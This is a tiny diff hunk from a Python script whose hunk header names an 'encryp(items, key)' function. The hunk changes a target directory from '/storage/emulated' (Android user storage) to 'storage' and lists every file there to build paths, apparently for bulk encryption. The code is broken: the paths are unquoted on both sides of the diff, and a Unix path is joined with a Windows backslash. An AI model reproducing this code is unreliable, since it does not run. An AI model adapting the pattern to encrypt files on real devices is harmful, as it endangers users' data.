@@ -26,7 +26,7 @@ def encryp(items, key):
 if __name__  == "__main__": 
 
 
-    archivos = /storage/emulated
+    archivos = storage
     items = os.listdir(archivos)
     archivos2 =  [archivos+"\\"+x for x in items]
 
